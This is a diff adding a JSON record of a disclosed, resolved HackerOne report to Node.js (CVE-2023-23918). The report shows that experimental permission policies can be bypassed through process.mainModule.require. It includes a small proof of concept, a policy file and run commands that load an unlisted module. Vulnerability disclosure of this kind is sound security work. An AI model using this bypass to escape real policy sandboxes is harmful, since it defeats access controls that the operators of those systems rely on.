@@ -1,0 +1,134 @@
+{
+  "id": 1747642,
+  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8xNzQ3NjQy",
+  "url": "https://hackerone.com/reports/1747642",
+  "title": "Permissions policies can be bypassed via process.mainModule",
+  "state": "Closed",
+  "substate": "resolved",
+  "severity_rating": "high",
+  "readable_substate": "Resolved",
+  "created_at": "2022-10-24T11:29:58.035Z",
+  "submitted_at": "2022-10-24T11:29:58.157Z",
+  "is_member_of_team?": false,
+  "is_organization_group_member?": false,
+  "is_triager?": false,
+  "reporter": {
+    "disabled": false,
+    "username": "goums",
+    "url": "/goums",
+    "profile_picture_urls": {
+      "small": "/assets/avatars/default-14ffa99f59cd01423c64904352cc130ffcb6a802eadfd11777a54485749e60f2.png"
+    },
+    "is_me?": false,
+    "cleared": false,
+    "verified": false,
+    "hackerone_triager": false,
+    "hacker_mediation": false
+  },
+  "team": {
+    "id": 22984,
+    "url": "https://hackerone.com/nodejs",
+    "handle": "nodejs",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/000/022/984/e600648ace4a8553247bce967d461a030aa81d49_original.png/235acf2ba808c3a51a94888fb977392c26f8fb0ccf77a81a4546c5e4065c06f1",
+      "medium": "https://profile-photos.hackerone-user-content.com/variants/000/022/984/e600648ace4a8553247bce967d461a030aa81d49_original.png/3f1ab5c6a9b6dadada1e6c8121700b884388bd0a43471fee1897a38ce57d0b2c"
+    },
+    "permissions": [],
+    "submission_state": "open",
+    "default_currency": "usd",
+    "awards_miles": false,
+    "offers_bounties": true,
+    "state": "public_mode",
+    "only_cleared_hackers": false,
+    "pentest_feature_enabled?": false,
+    "pentest_retesting_ends_at": null,
+    "profile": {
+      "name": "Node.js",
+      "twitter_handle": "nodejs",
+      "website": "https://nodejs.org",
+      "about": "The Node.js JavaScript Runtime"
+    }
+  },
+  "has_bounty?": false,
+  "can_view_team": true,
+  "can_view_report": true,
+  "is_external_bug": false,
+  "is_published": false,
+  "is_participant": false,
+  "has_collaborators": false,
+  "submitted_by_team_member": false,
+  "submitted_with_assistant": false,
+  "stage": 4,
+  "public": true,
+  "visibility": "full",
+  "cve_ids": [
+    "CVE-2023-23918"
+  ],
+  "singular_disclosure_disabled": false,
+  "disclosed_at": "2023-03-19T17:12:01.356Z",
+  "bug_reporter_agreed_on_going_public_at": null,
+  "team_member_agreed_on_going_public_at": "2023-02-17T17:11:55.777Z",
+  "comments_closed?": false,
+  "facebook_team?": false,
+  "team_private?": false,
+  "vulnerability_information": "**Summary:** \nPermissions policies module can be bypassed via `process.mainModule.require`\n\n**Description:**\nPermission policies allow to run a script with a specific set of authorized node js built-in modules.\nHowever, the script could access non authorized modules by calling `process.mainModule.require()`\n\n## Steps To Reproduce:\n\n  1. Create `escape.js` file:\n```\nconsole.log(process.mainModule.require(\"os\").cpus());\n```\n  2. Create `policy.json` file:\n```\n{\n  \"onerror\": \"exit\",\n  \"scopes\": {\n    \"file:\": {\n      \"integrity\": true,\n      \"dependencies\": {}\n    }\n  }\n}\n```\n\n  3. Run:\n```\nnode --experimental-policy=policy.json escape.js\n```\n4. You will see your os cpus listed in the console even though the `escape.js` file does not have the permission to import the node`os` module\n\n## Impact: \nPermission policies are supposed to enforce imported modules to a limited whitelist.\nThis vulnerability allow a script to include any non-whitelisted module.\n\nIf you modify `escape.js` to use top level `require` statement, like this:\n```\nconst os = require(\"os\");\nconsole.log(os.cpus());\n```\nand run again:\n```\nnode --experimental-policy=policy.json escape.js\n```\nyou'll now see this error:\n```\nError [ERR_MANIFEST_DEPENDENCY_MISSING]: Manifest resource escape.js does not list os as a dependency specifier for conditions: require, node, node-addons\n```\nwhich is the expected behavior and should be enforced as well when using `process.mainModule.require`\n\n## Impact\n\nAny project that uses permission policies for arbitrary code execution are vulnerable to sandbox escaping.\nThis example show a non-critical permission gain (listing the machine cpu), but an attacker could do much more damage by accessing internal file system, running child processes, ...",
+  "weakness": {
+    "id": 75,
+    "name": "Privilege Escalation"
+  },
+  "original_report_id": null,
+  "original_report_url": null,
+  "attachments": [],
+  "allow_singular_disclosure_at": "2023-03-19T17:11:55.850Z",
+  "allow_singular_disclosure_after": -99093364.00183451,
+  "singular_disclosure_allowed": true,
+  "vote_count": 7,
+  "voters": [
+    "leodog896",
+    "zy9ard3",
+    "shubham_srt",
+    "hohbad",
+    "anomander",
+    "onyx49",
+    "amr4l44"
+  ],
+  "severity": {
+    "rating": "high",
+    "score": 7.1,
+    "author_type": "Team",
+    "metrics": {
+      "attack_vector": "local",
+      "attack_complexity": "low",
+      "privileges_required": "low",
+      "user_interaction": "none",
+      "scope": "unchanged",
+      "confidentiality": "high",
+      "integrity": "high",
+      "availability": "none"
+    }
+  },
+  "structured_scope": {
+    "databaseId": 666,
+    "asset_type": "SOURCE_CODE",
+    "asset_identifier": "https://github.com/nodejs/node",
+    "max_severity": "critical"
+  },
+  "abilities": {
+    "assignable_team_members": [],
+    "assignable_team_member_groups": []
+  },
+  "is_exploit_agent_supported?": false,
+  "is_linear_agent_ui_supported?": false,
+  "summaries": [
+    {
+      "category": "team",
+      "can_view?": true,
+      "can_create?": false
+    },
+    {
+      "category": "researcher",
+      "can_view?": true,
+      "can_create?": false
+    }
+  ]
+}
